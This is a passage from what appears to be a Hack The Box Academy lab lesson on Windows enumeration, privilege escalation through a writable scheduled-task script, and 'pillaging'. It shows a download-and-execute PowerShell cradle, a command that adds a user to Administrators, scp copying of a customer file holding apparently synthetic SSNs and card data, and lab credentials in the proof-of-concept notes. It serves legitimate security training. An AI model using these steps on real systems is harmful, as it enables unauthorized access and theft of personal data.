============================= ========================================= =======
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

```

On this Windows target, three key privileges are enabled:

1. `SeChangeNotifyPrivilege` lets the user bypass directory traversal checks to navigate folders without explicit permissions (though it’s not immediately useful for us),

2. `SeImpersonatePrivilege` allows the user to impersonate others after authentication—an important capability for potential privilege escalation,

3. `SeIncreaseWorkingSetPrivilege` permits the user to increase the memory available to a process, which is a relatively minor privilege


Now, let’s take a look at the groups we are member of.

```powershell
PS C:\Users\john> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\\Event Log Readers            Alias            S-1-5-32-573 Mandatory group, Enabled by default, Enabled group
BUILTIN\\Remote Desktop Users         Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\\High Mandatory Level Label            S-1-16-12288

```

Looking at the groups output above, we can see that our user `john` belongs to several standard Windows groups like `Users`, `Remote Desktop Users`, and `Event Log Readers`. These groups grant basic access permissions but also suggest that this user has remote desktop capabilities, which we used to obtain a RDP session. The group memberships indicate this might be a regular user account with limited privileges, but we can perform additional checks with the commands `systeminfo` and `wmic qfe`.

```powershell
PS C:\Windows\system32> systeminfo

Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
+ systeminfo
+ ~~~~~~~~~~.
At line:1 char:1
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

PS C:\Windows\system32> wmic qfe

Program 'WMIC.exe' failed to run: Access is deniedAt line:1 char:1
+ wmic qfe
+ ~~~~~~~~.
At line:1 char:1
+ wmic qfe
+ ~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

```

The `systeminfo` command shows detailed information about the Windows system including OS version, hardware details, installed updates, and network settings, while `wmic qfe` specifically lists all installed Windows updates ( `qfe` stands for `Quick Fix Engineering`). Both commands require administrative or specific privileges to run, which is why we received `Access denied` errors. Our current user `john` is a regular user (for now) without the elevated permissions needed to view this system-level information.

When administrators configure servers, they often want to optimize the server to their own needs and comfort. One way to do so is by scheduling tasks and operations, and having them happen on regular basis. We can view the the scheduled tasks on the target with the following command:

```powershell
PS C:\Users\john> schtasks /query /fo LIST /v

Folder: \\
INFO: There are no scheduled tasks presently available at your access level.

Folder: \\Microsoft
INFO: There are no scheduled tasks presently available at your access level.

Folder: \\Microsoft\\Windows
HostName:                             WIN01
TaskName:                             \\Microsoft\\Windows\\Server Initial Configuration Task
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        10/6/2021 3:45:13 PM
Last Result:                          0
Author:                               $(@%systemroot%\\system32\\SrvInitConfig.exe,-100)
Task To Run:                          %windir%\\system32\\srvinitconfig.exe /disableconfigtask
Start In:                             N/A
Comment:                              $(@%systemroot%\\system32\\SrvInitConfig.exe,-101)
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

<SNIP>

Folder: \\
HostName:                             WIN01
TaskName:                             \\CorpBackupAgent
Next Run Time:                        2/24/2025 3:38:46 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        2/24/2025 3:36:46 PM
Last Result:                          0
Author:                               LOGGING-VM\\Administrator
Task To Run:                          powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\CorpBackup\\Scripts\\backupprep.ps1
Start In:                             N/A
Comment:                              Legacy backup agent health check and prep
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Administrator
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           11:56:46 AM
Start Date:                           2/23/2025
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        0 Hour(s), 2 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

```

When examining this extensive list, we can identify a scheduled backup task running under the administrator account. The "Task To Run" line reveals the exact command executed by the administrator, providing valuable information that we must document for further analysis.

Similar to how we used [linpeas.sh](http://linpeas.sh/) for the Linux target, there’s a Windows version called `winpeas` available in the [PEASS-ng](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) repository. Winpeas comes in three different file types for performing similar enumeration on Windows as linpeas does on Linux. In this case, we’ll use the PowerShell script since PowerShell is enabled on our Windows target. First, create a new directory and navigate to it, then download the `winpeas.ps1` script into that directory. Next, start an HTTP server on port 8080 using Python. Finally, instruct the Windows target to download the script from our attacking machine (Pwnbox) and save the output to a separate file for later review.

```shell
mkdir WIN01
cd WIN01
wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
python3 -m http.server 8080

```

```powershell
PS C:\Users\john> powershell "IEX(New-Object Net.WebClient).downloadString('http://<attacking-machine-IP>:8080/winpeas.ps1')" > winpeas.txt

<SNIP>

=========|| STARTUP APPLICATIONS Vulnerable Check
Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary
<https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#run-at-startup>
WIN01\\john has ownership of C:\\Documents and Settings\\john\\Start Menu\\Programs\\Startup
Identity WIN01\\john has 'FullControl' perms for C:\\Documents and Settings\\john\\Start Menu\\Programs\\Startup
WIN01\\john has ownership of C:\\Documents and Settings\\john\\Start Menu\\Programs\\Startup\\desktop.ini
Identity WIN01\\john has 'FullControl' perms for C:\\Documents and Settings\\john\\Start Menu\\Programs\\Startup\\desktop.ini
Identity BUILTIN\\Users BUILTIN\\Users has 'Write' perms for C:\\ProgramData
Identity BUILTIN\\Users BUILTIN\\Users has 'Write' perms for C:\\ProgramData
WIN01\\john has ownership of C:\\Users\\john\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
Identity WIN01\\john has 'FullControl' perms for C:\\Users\\john\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
WIN01\\john has ownership of C:\\Users\\john\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.ini
Identity WIN01\\john has 'FullControl' perms for C:\\Users\\john\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.ini

<SNIP>

```

Interestingly, the `STARTUP APPLICATIONS` section shows that we have write privileges for the `C:\ProgramData ` directory, which is unusual and worth noting. Next, let’s examine the open ports running on the system, as this can reveal services that operate locally or on another network interface.

```powershell
=========|| LISTENING PORTS

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2128
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       880
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3000           0.0.0.0:0              LISTENING       2568
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       300
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       3180
  TCP    0.0.0.0:8889           0.0.0.0:0              LISTENING       3180
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       480
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1280
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1608
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1992
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2688
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49675          0.0.0.0:0              LISTENING       648
  TCP    10.129.12.20:22        10.10.16.14:44826      ESTABLISHED     2128
  TCP    10.129.12.20:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:8001         0.0.0.0:0              LISTENING       3180
  TCP    127.0.0.1:8001         127.0.0.1:49673        ESTABLISHED     3180
  TCP    127.0.0.1:8003         0.0.0.0:0              LISTENING       3180
  TCP    127.0.0.1:49673        127.0.0.1:8001         ESTABLISHED     3180

```

When we scroll down a little bit, we will also see the user's information, including his security identifier (SID) and privileges.

```powershell
USER INFORMATION
----------------

User Name  SID
========== =============================================
win01\\john S-1-5-21-481531802-3248398329-2133938904-1002

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\\Event Log Readers            Alias            S-1-5-32-573 Mandatory group, Enabled by default, Enabled group
BUILTIN\\Remote Desktop Users         Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\\High Mandatory Level Label            S-1-16-12288

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

```

Following that, a comprehensive `System Information` section reveals details that the `systeminfo` command couldn’t capture, providing an excellent overview of the overall system. For instance, examining its assigned resources helps us gauge the potential workload of the server; if it were equipped with 16 processors and 128GB of physical memory, that would indicate a much higher operational capacity than what the current Windows target is configured with.

```powershell
====================================||SYSTEM INFORMATION ||====================================
The following information is curated. To get a full list of system information, run the cmdlet get-computerinfo

Host Name:                 WIN01
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-80716-06128-AA790
Original Install Date:     6/12/2024, 1:51:28 AM
System Boot Time:          3/5/2025, 1:59:36 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.23553139.B64.2403260936, 3/26/2024
Windows Directory:         C:\\Windows
System Directory:          C:\\Windows\\system32
Boot Device:               \\Device\\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-06:00) Central Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,736 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,314 MB
Virtual Memory: In Use:    1,485 MB
Page File Location(s):     C:\\pagefile.sys
Domain:                    HTBLAB
Logon Server:              \\\\WIN01
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB5009472
                           [02]: KB4577586
                           [03]: KB4589208
                           [04]: KB5010427
                           [05]: KB5009642
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.12.20
                                 [02]: fe80::847d:85e7:8587:af9e
                                 [03]: dead:beef::847d:85e7:8587:af9e
                                 [04]: dead:beef::22
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

* * *

Now, let’s create a summary of the key findings from our Windows system enumeration:

- `System Access`: We have local access as user `john` who is part of several groups including Remote Desktop Users and Event Log Readers

- `Unusual Permission`: We found write privileges to `C:\\ProgramData` directory, which is a security concern

- `Network Services`: Multiple ports are open including 22 (SSH), 3389 (RDP), 3000, 8000, and various Windows services

- `System Details`: Running Windows Server 2019 Standard with 4GB RAM, installed on June 12, 2024

- `User Privileges`: The account has a notable privilege including SeImpersonatePrivilege

- `Network Configuration`: System has one network interface with multiple IP addresses, including IPv6 addresses

- `Scheduled Tasks`: Located a PowerShell script named `backupprep.ps1` in the system that is being run as the administrator


These findings give us a decent overview of the target, but not much in terms of vulnerabilities. However, we still have the writable `C:\\ProgramData` directory and the `backupprep.ps1` script in the scheduled tasks, which runs as the administrator.


# Windows Vulnerability Assessment

* * *

Our focus during the vulnerability assessment stage will be on these two parts:

1. Writable `C:\\ProgramData` directory
2. Scheduled task that executes a `backupprep.ps1` script as the administrator

Windows Scheduled Tasks is a feature that helps administrators to automate common or frequent tasks. It lets administrators set up automatic actions like running programs or scripts at specific times or events. You can think of them as of a tool for automation. For example, a task can run every day at 3 AM or when someone logs into the computer. Each scheduled task has two main parts:

1. A trigger - this tells the task when to run (like daily, at startup, or when someone logs in)
2. An action - this is what the task actually does (like running a program or backing up files)

Administrators can control these tasks in several ways. They can:

- Set how important the task is
- Choose how long it can run
- Decide if it should try again if it fails
- Pick which user account runs the task

Such tasks can be managed using either the Windows interface, simple commands, or PowerShell, making it easy to set up automated maintenance, backups, and system checks on Windows Server. Generally speaking, as of now, they’re as secure as the administrator makes them. The system gives you rope; whether it’s a lifeline or a noose is up to you. This is what we try to assess.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](wR5H31iZnWKk)

When we have `Write` privileges to a specific directory, we also may have `Read` privileges, which allows us to look at its contents. Let’s find out if this is the case.

```powershell
PS C:\\ProgramData> ls

    Directory: C:\\ProgramData

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/23/2025  11:30 AM                CorpBackup
d---s-        10/6/2021   3:37 PM                Microsoft
d-----        2/25/2025  12:49 PM                Mozilla-1de4eec8-1241-4177-a864-e594e8d1fb38
d-----        6/20/2024   2:33 AM                Package Cache
d-----        6/12/2024   3:37 AM                Packages
d-----         3/5/2025   4:30 PM                regid.1991-06.com.microsoft
d-----        9/15/2018   2:19 AM                SoftwareDistribution
d-----         3/6/2025   7:51 AM                ssh
d-----        10/6/2021   3:40 PM                USOPrivate
d-----        10/6/2021   3:40 PM                USOShared
d-----        10/6/2021   3:50 PM                VMware

```

When we look inside the share, we can see there are several other directories. If we consider the name of the script we found for the scheduled task `backupprep.ps1` , the first entry in this directory stands out. The directory `CorpBackup` is definitely intriguing and worth delving into further. However, even if we didn't have privileges to list the contents of the directory, we still would have the `Write` privileges to the `backupprep.ps1` script, which is enough to edit it. Let’s move forward and explore the `CorpBackup` directory.

```powershell
PS C:\\ProgramData> ls .\\CorpBackup\\

    Directory: C:\\ProgramData\\CorpBackup

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/23/2025  11:50 AM                Logs
d-----        2/23/2025  11:38 AM                Scripts

PS C:\\ProgramData> ls .\\CorpBackup\\Scripts\\

    Directory: C:\\ProgramData\\CorpBackup\\Scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/23/2025  11:36 AM            405 backupprep.ps1

PS C:\\ProgramData> ls .\\CorpBackup\\Logs\\

    Directory: C:\\ProgramData\\CorpBackup\\Logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2025   1:30 PM         336914 healthcheck.log

```

This directory contains two subdirectories— `Scripts`, which holds the script executed by the administrator, and `Logs`, which stores a log file. It would be useful to determine if the `Write` privileges we have for this directory also apply to this file. We can check this using the built-in tool `icacls`, which is installed by default on Windows servers. Icacls manages NTFS file system permissions, specifically the discretionary access control lists ( `DACLs`), allowing administrators to view, modify, grant, deny, or remove permissions on files and directories. Although there are many permissions that can be set, the basic ones are as follows:

- `R` \- Read: View file contents, attributes, and permissions.
- `W` \- Write: Modify file contents, create new files, or change attributes.
- `D` \- Delete: Remove the file or directory.
- `F` \- Full Control: All possible permissions (read, write, delete, modify permissions, take ownership).
- `M` \- Modify: Read, write, delete, and modify attributes (a combo of R, W, D, plus some extras like delete subfolders).

Now, let’s check the permissions we have for this script.

```powershell
PS C:\\ProgramData> icacls "C:\\ProgramData\\CorpBackup\\Scripts\\backupprep.ps1"

C:\\ProgramData\\CorpBackup\\Scripts\\backupprep.ps1 Everyone:(I)(F)
                                                 NT AUTHORITY\\SYSTEM:(I)(F)
                                                 BUILTIN\\Administrators:(I)(F)
                                                 BUILTIN\\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

```

We can see that the file grants `Everyone:(I)(F)` full control, inherited from a parent directory. This is a red flag, as it allows any authenticated user (whether local or networked) to read, modify, or delete the script—opening the door to tampering or unauthorized execution of critical backup operations. Let’s document this vulnerability and leverage it as needed.


# Windows Privilege Escalation

* * *

Since we have confirmed that we have both `Read` and `Write` privileges for the `C:\ProgramData\CorpBackup\Scripts\backupprep.ps1` script—which is executed as Administrator—we can consider several methods to escalate our privileges:

- Script modification for code injection - Add a user to the administrators group and add a reverse shell
- Credential harvesting - Dump credentials or use it as a keylogger
- Persistence via task hijacking - Append code to maintain access by creating a new scheduled task that runs our payload frequently
- Changing Passwords - Change administrator’s password and create a new RDP session as the user `Administrator`

Essentially, we have an automation in place that executes PowerShell code with administrative privileges as long as the syntax is correct. Feel free to think of some other approaches and try them out later.

As with the Linux privelege escalation, we've also create a [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module that teaches use Windows specific techniques.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](9IgC5M0UrcMR)

* * *

In this case, we will go for the first option and add the user `john` to the administrators group. But first, we need to double check the group membership of user `john` . We can do this with the following command:

```powershell
PS C:\Users\john> net user john

User name                    john
Full Name                    john
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2025 10:57:29 AM
Password expires             Never
Password changeable          2/23/2025 10:57:29 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/5/2025 4:34:22 PM

Logon hours allowed          All

Local Group Memberships      *Event Log Readers    *Remote Desktop Users
                             *Users
Global Group memberships     *None
The command completed successfully.

```

Here, we see that `john` is a member of three groups: `Event Log Readers`, `Remote Desktop Users`, and `Users`. Now, let's shift our focus to the task scheduler. In your RDP session, press `[WINDOWS-KEY] + [R]` and type `taskschd.msc` to open the task scheduler.

![Windows Task Scheduler showing 'CorpBackupAgent' task, ready to run every 2 minutes, with description 'Legacy backup agent health check and prep'.](r92nkE4DaTux)

In the `Triggers` column, we can see that the script is executed every 2 minutes indefinitely. This means that once we have injected our code into the `backupprep.ps1` script, we might have to wait up to to 2 minutes until it is executed. Let’s open the `backupprep.ps1` with note pad, add the following line to at the end, and save it.

```powershell
Add-LocalGroupMember -Group "Administrators" -Member "WIN01\\john"

```

With this line at the end, every time the script is executed it will add the user `john` to the administrators group. This is also a form of persistence because if, for some reason, the `john` user is removed from the administrators group, the task scheduler will add him back every 2 minutes.

![Notepad showing CorpBackup health check script with PowerShell commands for system health and adding user 'WIN01\john' to Administrators group.](8jFfyLLLYEvO)

Now, let’s wait for two minutes to ensure that the Task Scheduler has had enough time to execute the script. Waiting the full two minutes guarantees that if our intended outcome doesn't occur, there is likely an issue with our code or another component.

Let’s run the `net user john` command again to check his group membership.

```powershell
PS C:\Users\john> net user john

User name                    john
Full Name                    john
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2025 10:57:29 AM
Password expires             Never
Password changeable          2/23/2025 10:57:29 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/5/2025 4:34:22 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Event Log Readers
                             *Remote Desktop Users *Users
Global Group memberships     *None
The command completed successfully.

```

![GIF showcasing the usage of the 'net user' command in a PowerShell terminal, displaying information about the user john, showcasing a scheduled task for the user running once a day to execute a PowerShell script.](Yh0JivgTLRdu.gif)

As you can see in the `Local Group Memberships` there is now another group called `Administrators` now. With this we have successfully escalated our privileges and can check it by navigating to `C:\Users\Administrator`. Only administrators have the permission to access this directory. Let’s summarize our findings and actions:

- We found out that the PowerShell script ( `backupprep.ps1`) runs with administrator privileges every 2 minutes
- We had `read` and `write` access to this script, which allowed us to modify it
- We added code to the script that adds the user `john` to the administrators group
- After waiting for the scheduled task to run, we confirmed that `john` was successfully added to the administrators group

We can do the same commands through an established Meterpreter shell without RDP too.

“For training purposes, we highly recommend you to try to figure out how to spawn a reverse shell by injecting code into this script. Also, try as many methods as you can think of because this will give you a much better understanding and flexibility for future cases.


# Windows Pillaging

* * *

Having successfully escalated our privileges and added our user `john` to the administrators group, we can resume system enumeration to search for interesting and sensitive files. We can run `winpeas.ps1` again, which will provide more detailed information, or alternatively use the `winpill.ps1` script that we created. The `winpill.ps1` script will extract the following information:

- System Information
- Hardware Information
- Services
- Running Processes
- Autorun Entries
- Non-Microsoft Scheduled Tasks
- User and Security Configuration
- Network Information
- Security Event Logs
- Software and Environment
- Sensitive and Interesting Files
- and some Privilege Escalation checks

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](KYfV2w98WFhk)

* * *

In order to use it, you need to download it from the `Resources` found above the list of the modules and transfer it to the Windows target. Then, we can execute it as administrator with the following command:

```powershell
PS C:\\Users\\john> Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File C:\\winpill.ps1"

<SNIP>
First 20 Interesting Files (sorted by LastWriteTime descending):

FullName                                                                                          LastWriteTime        Length
--------                                                                                          -------------        ------
C:\\Users\\Administrator\\Documents\\20250225\\PowerShell_transcript.WIN01.ZReyIwCY.20250225061421.txt 2/25/2025 6:28:44 AM 226685
C:\\Users\\Administrator\\Documents\\20250225\\PowerShell_transcript.WIN01.0yVwOAUc.20250225062647.txt 2/25/2025 6:26:48 AM    838
C:\\ProgramData\\CorpBackup\\Logs\\healthcheck.log                                                    2/25/2025 6:26:48 AM  23282
C:\\Users\\Administrator\\Documents\\20250225\\PowerShell_transcript.WIN01.HjEWinAi.20250225062447.txt 2/25/2025 6:24:48 AM    838
C:\\Users\\Administrator\\Documents\\20250225\\PowerShell_transcript.WIN01.FOxBy2DF.20250225062247.txt 2/25/2025 6:22:48 AM    838
C:\\Users\\Administrator\\customer_database.csv                                                      2/25/2025 6:21:33 AM  45729
<SNIP>

```

In the output, we will see a list of the first 20 interesting files. What sticks out is the `customer_database.csv` file, which seems to be an Excel spreadsheet and suggests the presences of customer related data. When we transfer it to our attacking machine (Pwnbox) and inspect it, we will see something interesting.

```shell
scp [email protected]:C:/Users/john/customer_database.csv ./customer_database.scv
cat customer_database.csv

Customer ID,First Name,Last Name,Email,Phone Number,Address,City,State,Zip Code,Country,Date of Birth,SSN,Credit Card Number,Credit Card Expiry,CVV
b7783bb2-8dd1-4f62-925c-ae5def54f1df,Steven,Stokes,[email protected],172.672.9922x6079,"32720 Curtis Neck
East Michaelmouth, SC 13735",Leonburgh,North Dakota,82053,Belgium,1973-08-19,071-04-7993,675983639542,06/34,368
6eff6dfb-df7c-48fb-8c29-e2202b9d7951,Melanie,Hogan,[email protected],7486560002,"637 Daniel Divide
Leeberg, NY 33782",Vickiebury,Kansas,25436,Puerto Rico,1979-05-27,073-47-7179,5458729718000888,12/31,376
2ef855f0-5435-4f1a-ae78-4b36e773e5e9,Tina,Salinas,[email protected],001-371-711-9963x939,"USS Martinez
FPO AP 70039",West Johnmouth,Wyoming,61292,Chile,1958-04-29,009-98-3992,38246869646039,03/32,759
<SNIP>

```

This file does in fact contain customer-related information, which is regulated by the GDPR in the EU and also constitutes Personally Identifiable Information (PII). PII encompasses any data capable of identifying an individual—either alone or in combination with other details—including names, Social Security numbers, addresses, phone numbers, email addresses, birth dates, financial account details, driver’s license numbers, medical records, and biometric data (e.g., fingerprints). Notably, GDPR fines can reach up to €20 million or 4% of annual global revenue, whichever is higher (for instance, British Airways faced a fine of £183 million in 2019), while CCPA penalties range from $2,500 to $7,500 per violation (per record), and HIPAA fines vary from $137 to $2.3 million per incident type. A breach affecting 1 million records could easily result in tens of millions of dollars in fines.

In this scenario, you have seen how data can be stolen by malicious actors (that they would then use to sell on the black market.) When you see or hear about a data leak, you now have a great understanding about what the process actually looked like for the hackers who stole the information.

* * *

Let’s summarize everything that we did and found out:

- After gaining administrator access, we used `winpill.ps1` to scan the system for sensitive information

- Most importantly, we found a customer spreadsheet file ( `customer_database.csv`) containing highly sensitive personal information

- The spreadsheet included customer details like:
  - Personal identification (names, SSNs, dates of birth)
  - Contact information (addresses, phone numbers, emails)
  - Financial data (credit card numbers with expiry dates and CVV)


# Proof-of-Concept

* * *

Writing and documenting a Proof-of-Concept ( `PoC`) is not as hard as many make it out to be. There are two different approaches that you can follow, and there is an old saying that' quite relevant.

- “Give me six hours to chop down a tree, and I'll spend the first four sharpening the axe.”

In other words, some tree cutters spend 2 hours sharpening their axes and then take 4 hours to cut down the tree, while others invest 4 hours in preparation and finish the job in just 2 hours. This illustrates that those who rush preparation often end up taking longer on the main task, whereas thorough initial preparation can significantly reduce the overall time and effort required. We recommend preparing carefully upfront, as it ultimately makes the work more efficient and less demanding.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](PInVaXkiwNoc)

* * *

When writing a PoC, think of it as a summary of all the necessary steps to reach your goal, organized in a clear structure to avoid confusion and ensure ease of understanding. A PoC is typically used by administrators or security teams to evaluate reported vulnerabilities and verify their existence, so we recommend structuring it according to the stages of the penetration testing process.

- Information Gathering
- Vulnerability Assessment
- Exploitation
- Local Information Gathering
- Local Vulnerability Assessment
- Post-Exploitation (Privilege Escalation)
- Privileged Local Information Gathering (Pillaging)
- Privileged Local Vulnerability Assessment

While organizing your steps into these stages, you can start by creating a list of commands used, accompanied by screenshots of the resulting outputs. Once everything is documented on a single page, add detailed descriptions for each command. For further automation, you might even write your own exploits in your preferred programming or scripting language.

However, having a stage-based structure with the corresponding and necessary commands in it with our notes that we took and a visual proof and a small description, the `PoC` can be easily replicated by others. Besides that it shows a structured approach which shows the quality of your work and this `PoC` can be considered as a small documentation.

Let’s take an example and create a PoC for the first stage on the Linux target, keeping in mind that a complete PoC should cover all steps from start to finish.

## Linux Target - Information Gathering

```bash
# 0. Summary

### FTP
- Access and Environment
- Anonymous FTP access was enabled on port 21
- We identified this as a home directory for user john
- Several important configuration and history files were accessible

### Critical Files
- .bash_history file revealed potential credentials: john:SuperSecurePass123
- SSH private key (id_rsa) was obtained and is not password protected
- WordPress setup documentation revealed temporary FTP configuration

### Security Implications
- Exposed SSH private key could allow unauthorized system access
- FTP server was intended to be temporary but remained accessible
- Internal documentation exposed system configuration details
- Command history revealed sensitive operations and potential credentials

### WordPress
- Running WordPress version 6.7.2 (Latest version)
- Server: Apache/2.4.52 (Ubuntu)
- XML-RPC enabled and accessible
- Theme: twentytwentyfive v1.0
- Plugin: hash-form v1.1.0 - vulnerable to RCE (CVE-2024-5084)

# ----------------------------------------------------------------------------------
# 1. Port & Service Discovery
sudo nmap -p- -sV 10.129.12.10 -T5 --open

Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-02-15 14:55 EST
Nmap scan report for cube-case.htb (10.129.12.10)
Host is up (0.048s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE          VERSION
21/tcp   open  ftp              ProFTPD
